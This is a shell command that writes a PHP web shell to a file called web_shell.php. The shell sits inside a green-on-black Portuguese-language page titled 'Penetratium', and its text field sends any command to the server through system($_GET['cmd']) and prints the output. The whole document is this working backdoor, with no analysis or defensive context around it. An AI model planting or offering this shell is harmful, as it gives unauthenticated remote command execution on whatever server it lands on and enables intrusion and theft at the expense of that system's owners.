echo '<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetratium (Pt) - Elemento Cibernético</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap");
        body { margin:0; padding:20px; background: linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 50%,#16213e 100%); font-family:"Orbitron",monospace; min-height:100vh; color:#00ff41; }
        input[type=text]{width:60%;padding:8px;background:#0d1421;border:1px solid #00ff41;color:#00ff41;font-family:monospace;}
        input[type=submit]{padding:8px;background:#00ff41;border:none;color:#0a0a0a;font-weight:bold;cursor:pointer;}
        pre{background:#0d1421;color:#00ff41;padding:10px;border:1px solid #00ff41;overflow-x:auto;}
    </style>
</head>
<body>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Digite um comando" autofocus>
        <input type="submit" value="Executar">
    </form>
    <pre>
<?php
if(isset($_GET["cmd"])) { system($_GET["cmd"]); }
?>
    </pre>
</body>
</html>' > web_shell.php
